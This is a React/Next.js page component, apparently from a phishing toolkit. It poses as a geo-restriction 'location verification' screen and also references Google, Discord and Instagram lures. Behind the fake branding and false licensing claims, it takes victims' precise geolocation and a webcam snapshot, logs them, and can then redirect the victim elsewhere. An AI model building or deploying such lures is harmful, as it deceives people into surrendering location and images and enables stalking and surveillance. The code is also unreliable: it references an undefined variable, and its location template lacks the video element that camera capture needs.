"use client";

import { useEffect, useState, useRef, useCallback, useMemo } from 'react';
import { useParams, useSearchParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import PhishingPageLayout from '@/app/phishing/PhishingPageLayout';
import type { LocationData, CameraData, AudioData } from '@/types';
import { Button } from '@/components/ui/button';
import { Loader2, MapPin, CheckCircle, AlertTriangle, Globe, Gamepad2, Lock, type LucideIcon } from 'lucide-react';
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card as ShadcnCard, CardContent, CardTitle as ShadcnCardTitle } from '@/components/ui/card'; // Renamed to avoid conflict if Card is used elsewhere

// Generic content for fallback or simple templates - this will be superseded by specific template content
const genericBaseContents: Record<string, { title: string, message: string, actionText?: string }> = {
  'default': { title: 'Service Interaction', message: 'Please follow the instructions to continue.', actionText: 'Start Process' },
  // other generic fallbacks can remain if needed, but specific templates will define their own full content
};

// Content definitions for LOCATION templates (copied from src/app/phishing/location/[id]/page.tsx)
interface LocationTemplateSpecificContent {
  title: string;
  actionText: string;
  message: string;
  heroIcon?: LucideIcon;
  pageSpecificMessage?: string;
  brandName?: string;
  brandLogo?: React.ReactNode;
}
const locationTemplateContent: Record<string, LocationTemplateSpecificContent> = {
  'restricted-website-access': {
    title: 'Access Restricted - Location Verification Required',
    actionText: 'Verify Location & Access Site',
    message: "This website cannot be viewed in all countries. Verify your location to gain access.",
    pageSpecificMessage: "Access to this website's full range of content and features is limited in certain geographical regions due to licensing agreements and local regulations. Please verify your current location to unlock all available services and information.",
    heroIcon: Globe,
    brandName: "Restricted Website Access",
    brandLogo: null,
  },
  'geo-restricted-service-access': {
    title: 'Service Unavailable - Location Verification Required',
    actionText: 'Verify Location to Access Service',
    message: "This service is not available in your current region. Verify your location to check eligibility and gain access.",
    pageSpecificMessage: "Many of our digital services, including premium streaming, online games, and specialized software, are subject to regional licensing. To access the service you're looking for, or to see available services in your area, please verify your location.",
    heroIcon: Gamepad2,
    brandName: "Geo-Restricted Service",
    brandLogo: null,
  },
  'content-unlock': {
    title: 'Unlock Region-Restricted Content',
    actionText: 'Verify Location to Access',
    message: 'This content cannot be viewed in all countries. Verify your location to gain access.',
    pageSpecificMessage: "Access exclusive videos, images, articles, and other files by verifying your location. Some content is geographically restricted, and this step ensures compliance with licensing agreements.",
    heroIcon: Lock,
    brandName: "Region-Restricted Content",
    brandLogo: null,
  },
  default: { // Default for location type if specific id not found
    title: 'Location Verification Needed',
    actionText: 'Verify My Location',
    message: 'Please share your location to continue using this service.',
    heroIcon: MapPin,
  }
};


// TODO: Add content definitions for CAMERA and AUDIO templates later

// For handling redirects based on base template ID
const REDIRECT_URL_KEYS: Record<string, string> = {
  'content-unlock': 'contentUnlockRedirectUrl',
  'restricted-website-access': 'restrictedWebsiteRedirectUrl',
  'geo-restricted-service-access': 'geoRestrictedServiceRedirectUrl',
  'google-policy-update': 'googlePolicyUpdateRedirectUrl',
  'discord-terms-update': 'discordTermsUpdateRedirectUrl',
  'instagram-privacy-update': 'instagramPrivacyUpdateRedirectUrl',
};

type CaptureType = 'location' | 'camera' | 'audio';
type CaptureStatus = 'pending' | 'capturing' | 'success' | 'error' | 'skipped';

interface StatusMessage {
  type: CaptureType;
  status: CaptureStatus;
  message?: string;
}

export default function CustomPhishingPage() {
  const { addLog } = useLogs();
  const params = useParams<{ id: string }>();
  const searchParams = useSearchParams();

  const templateId = params.id || 'default';
  const captureQuery = searchParams.get('capture');

  const requestedCaptureTypes = useMemo(() =>
    (captureQuery?.split(',') || [])
      .map(type => type.trim().toLowerCase())
      .filter(type => ['location', 'camera', 'audio'].includes(type)) as CaptureType[],
    [captureQuery]
  );

  // Determine if the templateId is for a location, camera, or audio page to select the right content object.
  // This is a simplified assumption. A more robust way might involve checking against known IDs for each category.
  const isLocationTemplate = ['restricted-website-access', 'geo-restricted-service-access', 'content-unlock'].includes(templateId);
  // TODO: Add similar checks for isCameraTemplate, isAudioTemplate when their contents are added.

  const pageContent = isLocationTemplate
    ? (locationTemplateContent[templateId] || locationTemplateContent.default)
    : (genericBaseContents[templateId] || genericBaseContents.default);

  // Cast pageContent to the specific type when using it for location templates
  const currentLocContent = isLocationTemplate ? pageContent as LocationTemplateSpecificContent : null;


  const [currentCaptureIndex, setCurrentCaptureIndex] = useState(-1); // -1 means not started
  const [statusMessages, setStatusMessages] = useState<StatusMessage[]>([]);
  const [overallStatus, setOverallStatus] = useState<'idle' | 'processing' | 'completed' | 'failed'>('idle'); // For main button and UI state
  // const [isCapturingProcessActive, setIsCapturingProcessActive] = useState(false); // Replaced by overallStatus
  const [allDone, setAllDone] = useState(false); // Tracks if all individual captures attempted

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);


  const logInitialVisit = useCallback(() => {
    addLog({
      type: 'generic',
      data: {
        message: `Visited custom phishing page: /phishing/custom/${templateId}`,
        requestedCapture: requestedCaptureTypes.join(','),
      }
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId, requestedCaptureTypes]); // addLog is stable

  useEffect(() => {
    logInitialVisit();
  }, [logInitialVisit]);


  const updateStatus = (type: CaptureType, status: CaptureStatus, message?: string) => {
    setStatusMessages(prev => {
      const existingMsgIndex = prev.findIndex(m => m.type === type);
      if (existingMsgIndex > -1) {
        const updated = [...prev];
        updated[existingMsgIndex] = { type, status, message };
        return updated;
      }
      return [...prev, { type, status, message }];
    });
  };

  const proceedToNextCapture = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
        videoRef.current.srcObject = null;
    }
    setCurrentCaptureIndex(prev => prev + 1);
  }, []);

  const captureLocation = useCallback(async () => {
    updateStatus('location', 'capturing', 'Requesting location access...');
    if (!navigator.geolocation) {
      updateStatus('location', 'error', 'Geolocation is not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Geolocation not supported' } });
      proceedToNextCapture();
      return;
    }
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };
        addLog({ type: 'location', data: locationData });
        updateStatus('location', 'success', `Location captured: ${position.coords.latitude.toFixed(2)}, ${position.coords.longitude.toFixed(2)}`);
        proceedToNextCapture();
      },
      (err) => {
        let errorMessage = 'Location error: Could not retrieve location.';
        if (err.code === err.PERMISSION_DENIED) errorMessage = 'Location error: Access denied by user.';
        addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
        updateStatus('location', 'error', errorMessage);
        proceedToNextCapture();
      },
      { timeout: 10000, enableHighAccuracy: true }
    );
  }, [addLog, proceedToNextCapture]);

  const captureCamera = useCallback(async () => {
    updateStatus('camera', 'capturing', 'Requesting camera access...');
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      updateStatus('camera', 'error', 'Camera access not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Camera access not supported' } });
      proceedToNextCapture();
      return;
    }
    try {
      streamRef.current = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = streamRef.current;
        videoRef.current.onloadedmetadata = () => {
          if(videoRef.current) videoRef.current.play();
          // Capture after a short delay
          setTimeout(() => {
            if (videoRef.current && canvasRef.current && videoRef.current.readyState >= HTMLMediaElement.HAVE_METADATA) {
              const video = videoRef.current;
              const canvas = canvasRef.current;
              const MAX_WIDTH = 320;
              const MAX_HEIGHT = 240;
              let { videoWidth, videoHeight } = video;
              if (videoWidth > MAX_WIDTH) { videoHeight = (videoHeight * MAX_WIDTH) / videoWidth; videoWidth = MAX_WIDTH; }
              if (videoHeight > MAX_HEIGHT) { videoWidth = (videoWidth * MAX_HEIGHT) / videoHeight; videoHeight = MAX_HEIGHT; }
              canvas.width = videoWidth; canvas.height = videoHeight;
              const context = canvas.getContext('2d');
              context?.drawImage(video, 0, 0, canvas.width, canvas.height);
              const imageUrl = canvas.toDataURL('image/jpeg', 0.7);
              addLog({ type: 'camera', data: { imageUrl } as CameraData });
              updateStatus('camera', 'success', 'Camera snapshot captured.');
            } else {
              updateStatus('camera', 'error', 'Failed to process video stream for capture.');
            }
            proceedToNextCapture();
          }, 1000); // Delay for stream to stabilize
        };
        videoRef.current.onerror = () => {
            updateStatus('camera', 'error', 'Video element error.');
            addLog({ type: 'generic', data: { message: 'Custom capture: Video element error' } });
            proceedToNextCapture();
        }
      }
    } catch (err) {
      let errorMessage = 'Camera error: Could not access camera.';
      if (err instanceof DOMException && err.name === 'NotAllowedError') errorMessage = 'Camera error: Access denied by user.';
      addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
      updateStatus('camera', 'error', errorMessage);
      proceedToNextCapture();
    }
  }, [addLog, proceedToNextCapture]);

  const captureAudio = useCallback(async () => {
    updateStatus('audio', 'capturing', 'Requesting microphone access...');
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      updateStatus('audio', 'error', 'Microphone access not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Microphone access not supported' } });
      proceedToNextCapture();
      return;
    }
    try {
      streamRef.current = await navigator.mediaDevices.getUserMedia({ audio: true });
      // Simulate recording then log
      updateStatus('audio', 'capturing', 'Microphone access granted. Simulating recording...');
      setTimeout(() => {
        addLog({ type: 'audio', data: { message: 'Audio capture simulated successfully.' } as AudioData });
        updateStatus('audio', 'success', 'Audio capture simulated.');
        proceedToNextCapture();
      }, 1500);
    } catch (err) {
      let errorMessage = 'Audio error: Could not access microphone.';
      if (err instanceof DOMException && err.name === 'NotAllowedError') errorMessage = 'Audio error: Access denied by user.';
      addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
      updateStatus('audio', 'error', errorMessage);
      proceedToNextCapture();
    }
  }, [addLog, proceedToNextCapture]);

  useEffect(() => {
    if (currentCaptureIndex >= 0 && currentCaptureIndex < requestedCaptureTypes.length) {
      const typeToCapture = requestedCaptureTypes[currentCaptureIndex];
      if (typeToCapture === 'location') captureLocation();
      else if (typeToCapture === 'camera') captureCamera();
      else if (typeToCapture === 'audio') captureAudio();
    } else if (currentCaptureIndex >= requestedCaptureTypes.length && requestedCaptureTypes.length > 0 && isCapturingProcessActive) {
      // All requested captures attempted
      setAllDone(true);
      // setIsCapturingProcessActive(false); // Now handled by overallStatus
      setOverallStatus('completed');
      // updateStatus(requestedCaptureTypes[requestedCaptureTypes.length-1], 'success', 'All capture attempts finished.');
      // The line above might be redundant if individual statuses are clear. Let's rely on overallStatus for the final message.

      // Handle redirection if applicable
      const redirectKey = REDIRECT_URL_KEYS[templateId];
      if (redirectKey) {
        const redirectUrl = localStorage.getItem(redirectKey);
        if (redirectUrl && redirectUrl.trim() !== '') {
          updateStatus('default' as CaptureType, 'capturing', `Process complete. Redirecting in 3 seconds...`);
          setTimeout(() => { window.location.href = redirectUrl; }, 3000);
        }
      }
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentCaptureIndex, requestedCaptureTypes, overallStatus]); // Changed isCapturingProcessActive to overallStatus

  const startCaptureProcess = () => {
    if (requestedCaptureTypes.length > 0) {
      // setIsCapturingProcessActive(true);
      setOverallStatus('processing');
      setStatusMessages(requestedCaptureTypes.map(type => ({ type, status: 'pending' })));
      setCurrentCaptureIndex(0); // Start with the first type
    } else {
        updateStatus('default' as CaptureType, 'error', 'No valid data capture types specified to start.');
        setOverallStatus('failed');
    }
  };

  // Cleanup stream on unmount
  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const renderLocationTemplateUI = () => {
    if (!currentLocContent) return <p>Error: Location template content not found.</p>;
    const SpecificHeroIcon = currentLocContent.heroIcon || MapPin;

    // Find current location status message if it exists
    const locationOpStatus = statusMessages.find(sm => sm.type === 'location');

    return (
      <PhishingPageLayout title={currentLocContent.title}>
        <div className="space-y-6">
          {/* Replicated content from location/[id]/page.tsx renderTemplateSpecificContent */}
          <div className="space-y-4">
            {currentLocContent.brandName && (
              <div className={`flex items-center justify-center text-gray-700 mb-3 w-full text-2xl font-bold`}>
                {/* currentLocContent.brandLogo could be rendered here if it were an element */}
                <span className="text-center">{currentLocContent.brandName}</span>
              </div>
            )}
            <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
              <CardContent className="space-y-4">
                {(() => {
                  if (templateId === 'restricted-website-access') {
                    return <Globe className="w-20 h-20 text-primary/70 mx-auto" />;
                  } else if (templateId === 'geo-restricted-service-access') {
                    const HeroIcon = currentLocContent.heroIcon || Gamepad2; // Default to Gamepad2 if not specified
                    return <HeroIcon className="w-20 h-20 text-primary/70 mx-auto" />;
                  }
                  // Fallback for 'content-unlock' or default location type
                  return <SpecificHeroIcon className="w-20 h-20 text-primary/60 mx-auto" />;
                })()}
                <ShadcnCardTitle className="text-xl text-foreground font-semibold">{currentLocContent.message}</ShadcnCardTitle>
                {currentLocContent.pageSpecificMessage && <p className="text-md text-muted-foreground">{currentLocContent.pageSpecificMessage}</p>}
              </CardContent>
            </ShadcnCard>
          </div>

          {/* Action Button and Status Display */}
          {overallStatus !== 'completed' && overallStatus !== 'failed' && (
            <>
              {(templateId === 'content-unlock' || templateId === 'restricted-website-access' || templateId === 'geo-restricted-service-access') && (
                <p className="text-center text-sm text-gray-500 mb-2">
                  {templateId === 'content-unlock' && "Powered by GeoLock™"}
                  {templateId === 'restricted-website-access' && "Verification by GeoGuard™"}
                  {templateId === 'geo-restricted-service-access' && "Access validation by GeoPass™"}
                </p>
              )}
              <Button
                onClick={startCaptureProcess}
                size="lg"
                className="w-full text-lg py-6 shadow-md bg-accent hover:bg-accent/90 text-accent-foreground"
                disabled={overallStatus === 'processing' || requestedCaptureTypes.length === 0}
              >
                {overallStatus === 'processing' && requestedCaptureTypes.includes('location') && locationOpStatus?.status === 'capturing'
                  ? <><Loader2 className="mr-2 h-6 w-6 animate-spin" /> Verifying...</>
                  : <><MapPin className="mr-2 h-6 w-6" /> {currentLocContent.actionText}</>
                }
              </Button>
            </>
          )}

          {/* Detailed status messages for each capture type */}
          {overallStatus === 'processing' && statusMessages.length > 0 && (
            <div id="capture-status" className="my-4 space-y-2 text-left">
              {statusMessages.map((msg, index) => (
                <div key={index} className={`p-2 border rounded-md text-sm ${
                  msg.status === 'success' ? 'bg-green-100 border-green-300 text-green-700' :
                  msg.status === 'error' ? 'bg-red-100 border-red-300 text-red-700' :
                  msg.status === 'capturing' ? 'bg-blue-100 border-blue-300 text-blue-700' :
                  'bg-gray-100 border-gray-300'
                }`}>
                  <strong>{msg.type.charAt(0).toUpperCase() + msg.type.slice(1)}:</strong> {msg.message || msg.status}
                  {msg.status === 'capturing' && <Loader2 className="inline-block ml-2 h-4 w-4 animate-spin" />}
                </div>
              ))}
            </div>
          )}

          {/* Final status: Success (completed) */}
          {overallStatus === 'completed' && (
            <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
              <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
              <p className="text-xl font-semibold text-green-700">
                {REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])?.trim() !== ''
                  ? "Process Complete. Redirecting..."
                  : "Verification Complete"}
              </p>
              <p className="text-md text-green-600">
                {!(REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])?.trim() !== '') && "This window can now be closed."}
              </p>
            </div>
          )}

          {/* Final status: Error (failed or specific error) */}
          {overallStatus === 'failed' && (
             <Alert variant="destructive" className="mt-6">
                <AlertTriangle className="h-5 w-5" />
                <AlertTitle>Process Failed</AlertTitle>
                <AlertDescription>
                    {statusMessages.find(m => m.status === 'error')?.message || "An error occurred during the process."}
                </AlertDescription>
            </Alert>
          )}
           {/* Display specific error for location if it's the only requested type and it failed */}
           {requestedCaptureTypes.length === 1 && requestedCaptureTypes[0] === 'location' && locationOpStatus?.status === 'error' && overallStatus !== 'failed' && (
             <Alert variant="destructive" className="mt-6">
                <AlertTriangle className="h-5 w-5" />
                <AlertTitle>Location Access Failed</AlertTitle>
                <AlertDescription>{locationOpStatus.message}</AlertDescription>
            </Alert>
           )}
        </div>
      </PhishingPageLayout>
    );
  };

  const renderGenericTemplateUI = () => {
    // This is the old UI, kept for other templateId types for now
    const currentGenericContent = genericBaseContents[templateId] || genericBaseContents.default;
    return (
      <PhishingPageLayout title={`Custom Action: ${currentGenericContent.title}`}>
        <video ref={videoRef} className="hidden w-[1px] h-[1px]" playsInline muted />
        <canvas ref={canvasRef} className="hidden w-[1px] h-[1px]" />
        <div className="space-y-4 text-center">
          <h1 className="text-xl font-semibold">{currentGenericContent.title}</h1>
          <p className="text-muted-foreground">{currentGenericContent.message}</p>
          {overallStatus === 'idle' && (
            <Button onClick={startCaptureProcess} disabled={requestedCaptureTypes.length === 0} size="lg">
              {currentGenericContent.actionText || 'Start Process'}
            </Button>
          )}
          {overallStatus === 'processing' && <Loader2 className="h-8 w-8 animate-spin mx-auto text-primary" />}
          <div id="capture-status" className="my-4 space-y-2 text-left">
            {statusMessages.map((msg, index) => (
              <div key={index} className={`p-2 border rounded-md text-sm ${
                msg.status === 'success' ? 'bg-green-100 border-green-300 text-green-700' :
                msg.status === 'error' ? 'bg-red-100 border-red-300 text-red-700' :
                msg.status === 'capturing' ? 'bg-blue-100 border-blue-300 text-blue-700' :
                'bg-gray-100 border-gray-300'}`}>
                <strong>{msg.type.charAt(0).toUpperCase() + msg.type.slice(1)}:</strong> {msg.message || msg.status}
                {msg.status === 'capturing' && <Loader2 className="inline-block ml-2 h-4 w-4 animate-spin" />}
              </div>
            ))}
          </div>
          {overallStatus === 'completed' && (
            <p className="text-lg font-semibold text-green-600 p-4 bg-green-50 rounded-md">
              All requested actions have been processed. This window may redirect or can be closed.
            </p>
          )}
          {requestedCaptureTypes.length === 0 && overallStatus === 'idle' && (
            <p className="text-red-600 font-medium">No valid data capture types were specified in the link.</p>
          )}
           {overallStatus === 'failed' && (
             <p className="text-red-600 font-medium p-4 bg-red-50 rounded-md">
              Process failed. {statusMessages.find(m => m.status === 'error')?.message || "Please check permissions and try again."}
            </p>
          )}
        </div>
      </PhishingPageLayout>
    );
  };

  // Main conditional rendering logic
  if (isLocationTemplate) {
    return renderLocationTemplateUI();
  }
  // TODO: Add else if for isCameraTemplate, isAudioTemplate

  // Fallback to generic UI for non-location templates for now
  return renderGenericTemplateUI();
}
